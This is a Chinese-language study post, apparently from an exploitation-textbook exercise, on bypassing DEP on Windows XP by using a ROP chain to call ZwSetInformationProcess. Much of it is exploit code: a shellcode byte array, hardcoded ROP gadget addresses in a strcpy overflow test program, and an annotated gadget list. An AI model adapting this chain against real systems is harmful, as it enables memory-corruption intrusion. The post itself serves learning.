##   繞過DEP 

##  使用 ZwSetInformationProcess 關閉進程的DEP
#### 書上是使用ZwSetInformationProcess過程中  的LdrpCheckNXCompatibility 函數。


----
####   LdrpCheckNXCompatibility  繞過非常簡單，只要 ROP 讓al =1  和  EBP= 一個堆疊位置。在去調用它， 它會自動幫我們設定好4個參數，然後去調用 ZwSetInformationProcess 。
----



##   但是我在我的XP上用 windbg 就是找不到 LdrpCheckNXCompatibility，所以只好自己設定   ZwSetInformationProcess 的四個參數。



###   以下是自己調整出來的規劃空間

###  ROP 步驟。

#### 1 一開始設定定錨點，然後根據定錨點規劃
#### 2 設定4個參數
#### 3 最後調整ESP 到 ZwSetInformationProcess  執行完DEP 被關閉。

####  最後 退出 ZwSetInformationProcess 時的結尾是 retn +0x10
####  retn的位置放jmp esp跳板，跳到esp上時第一條指令就是往上跳到 shellcode 



###  以下是規劃圖

![enter image description here](https://i.imgur.com/Dmnntnj.jpg)



###   mona.py 幫我們找出rop gadget

![enter image description here](https://i.imgur.com/UaxXYvM.png)


![enter image description here](https://i.imgur.com/beQ195q.png)






###   注意 ROP 沒有絕對的答案，要根據自己的環境建構。另外char tt[]跟書上的緩衝區有被我加大，因為我ROP 的太大了導致shellcode往下塞會爆掉，其實可以找更小的ROP，但是很累。最後選擇往上塞，所以才加大空間。


```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
char shellcode[]=



"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
//168

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//236


"\x80\xdc\x92\x7c" // zw
"\xf7\x56\xd4\x77" // jmp esp 

"BBBB" // 參數1 
"BBBB" // 參數2
"BBBB" // 參數3
"BBBB" // 參數4

"\xe9\x4f\xfe\xff\xff" // 大跳 跳上到 shellcode 

"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" 
// 71 +16 +8 =95

// rop
"\x01\x07\x76\x7d"
"\x87\xcb\xf5\x77"
"\xAA\xAA\xAA\xAA"
"\x2e\x4c\x95\x7c"
"\x90\x90\x90\x90"
"\x2e\x4c\x95\x7c"
"\x90\x90\x90\x90"
"\x80\x37\x18\x77"
"\xab\xa0\x5f\x7d"
"\xd9\xbc\xfd\x73"
"\x97\xd6\xeb\x77"
"\xb8\x19\x59\x7d"
"\xfc\x57\xde\x77"
"\x90\x90\x90\x90"
"\xab\xa0\x5f\x7d"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\x46\x10\xe8\x77"
"\x46\x10\xe8\x77"
"\x65\x2f\xfe\x73"
"\xed\x62\xd4\x77"
"\xab\xa0\x5f\x7d"
"\x80\xf2\xc0\x77"
"\xfc\x57\xde\x77"
"\x90\x90\x90\x90"
"\x42\xe8\xbe\x77"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\x90\x90\x90\x90"
"\xf5\xd7\xbe\x77"
"\x90\x90\x90\x90"
"\x2f\xb9\xeb\x77"
"\xb0\x0d\xf6\x77"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\xb8\x19\x59\x7d"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\xb8\x19\x59\x7d"
"\xb8\x19\x59\x7d"
"\xb8\x19\x59\x7d"
"\xfc\x57\xde\x77"
"\x90\x90\x90\x90"
"\xab\xa0\x5f\x7d"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\x21\x65\x77\x7d"
"\x90\x90\x90\x90"
"\xb8\x19\x59\x7d"
"\xb8\x19\x59\x7d"
"\xb8\x19\x59\x7d"
"\xb8\x19\x59\x7d"
"\xfc\x57\xde\x77"
"\x90\x90\x90\x90"
"\x62\xd0\x83\x7c"
"\xAA\xAA\xAA\xAA"
"\xAA\xAA\xAA\xAA"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\xdb\xc2\x93\x7c"
"\x84\xa5\xf1\x77"

;



void test()
{
	char tt[500];
	strcpy(tt,shellcode);
}
int main()
{
	HINSTANCE hInst = LoadLibrary("shell32.dll");
	char temp[300];
	test();
    return 0;
}

```
###  ROP gadget 清單說明
```



[ebp = iesp]
0x7d760701 (RVA : 0x001d0701) : # INC EAX # PUSH ESP # POP EBP # RETN 0x04    ** [shell32.dll] **   |  ascii {PAGE_EXECUTE_READ}


[eax=iesp]
0x77f5cb87 (RVA : 0x0001cb87) : # XCHG EAX,EBP # RETN    ** [SHLWAPI.dll] **   |   {PAGE_EXECUTE_READ}



[eax= iesp-60]
0x7c954c2e (RVA : 0x00034c2e) : # SUB EAX,30 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c954c2e (RVA : 0x00034c2e) : # SUB EAX,30 # POP EBP # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}


[edi=iesp -60]
0x77183780 (RVA : 0x00003780) : # XCHG EAX,EDI # RETN    ** [comctl32.dll] **   |   {PAGE_EXECUTE_READ}



[eax = -1]
0x7d5fa0ab (RVA : 0x0006a0ab) : # XOR EAX,EAX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x73fdbcd9 (RVA : 0x0003bcd9) : # DEC EAX # RETN    ** [USP10.dll] **   |   {PAGE_EXECUTE_READ}






[ecx=iesp-60]
0x77ebd697 (RVA : 0x0006d697) : # MOV ECX,EDI # DEC ECX # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}

[參數-1 OK]
0x77de57fc :  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RETN 0x08    ** [ADVAPI32.dll] **   |   {PAGE_EXECUTE_READ}

///////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////


[eax=4]
0x7d5fa0ab (RVA : 0x0006a0ab) : # XOR EAX,EAX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x77e81046 (RVA : 0x00031046) : # ADD EAX,2 # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}
0x77e81046 (RVA : 0x00031046) : # ADD EAX,2 # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}

[eax=ecx+4]
0x73fe2f65 (RVA : 0x00042f65) : # ADD EAX,ECX # RETN    ** [USP10.dll] **   |   {PAGE_EXECUTE_READ}

[ecx= iesp-60+4 ]
0x77d462ed (RVA : 0x000362ed) : # XCHG EAX,ECX # RETN    ** [USER32.dll] **   |   {PAGE_EXECUTE_READ}

[eax=22]
0x7d5fa0ab (RVA : 0x0006a0ab) : # XOR EAX,EAX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x77c0f280 :  # ADD AL,22 # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}


[參數 22 OK]
0x77de57fc :  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RETN 0x08    ** [ADVAPI32.dll] **   |   {PAGE_EXECUTE_READ}

////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////





[eax= iesp-60]
0x77bee842 (RVA : 0x0000e842) : # PUSH EDI # POP EAX # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}


[eax= iesp-60 +20 ]
0x77bed7f5 (RVA : 0x0000d7f5) : # ADD EAX,20 # POP EBP # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}


[esi=0]
0x77ebb92f (RVA : 0x0006b92f) : # XOR ESI,ESI # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}


[esi=2]     # [2 被放進  iesp-60 +20]  
0x77f60db0 :  # ADD ESI,2 # MOV DWORD PTR DS:[EAX],ESI # POP ESI # POP EBP # RETN 0x0C    ** [SHLWAPI.dll] **   |   {PAGE_EXECUTE_READ}


[ecx = iesp -60 +8 ]
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}



[參數 3 OK]
0x77de57fc :  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RETN 0x08    ** [ADVAPI32.dll] **   |   {PAGE_EXECUTE_READ}


////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////




[eax= 4]
0x7d5fa0ab (RVA : 0x0006a0ab) : # XOR EAX,EAX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d776521 (RVA : 0x001e6521) : # ADD EAX,4 # POP ESI # RETN    ** [shell32.dll] **   |  asciiprint,ascii {PAGE_EXECUTE_READ}


[ecx = iesp -60 +c ]
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}
0x7d5919b8 (RVA : 0x000019b8) : # INC ECX # RETN    ** [shell32.dll] **   |   {PAGE_EXECUTE_READ}



[參數 4 OK]
0x77de57fc :  # MOV DWORD PTR DS:[ECX],EAX # POP EBP # RETN 0x08    ** [ADVAPI32.dll] **   |   {PAGE_EXECUTE_READ}




///////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////



[eax = iesp-60]
0x7c83d062 (RVA : 0x0003d062) : # XCHG EAX,EDI # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}



[[eax = iesp-60-8]
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}

0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
0x7c93c2db (RVA : 0x0001c2db) : # DEC EAX # RETN    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}


[esp = iesp-60-8 ]
0x77f1a584 (RVA : 0x0002a584) : # XCHG EAX,ESP # RETN    ** [GDI32.dll] **   |   {PAGE_EXECUTE_READ}


[跳到Zw]
```

###  成功
![enter image description here](https://i.imgur.com/deBfPEe.png)



###   詳細的ZwSetInformationProcess 參數，和ROP 編寫可以參考這裡。

[找到第一劍的進階型態](http://securityalley.blogspot.com/2015/02/blog-post_6.html)
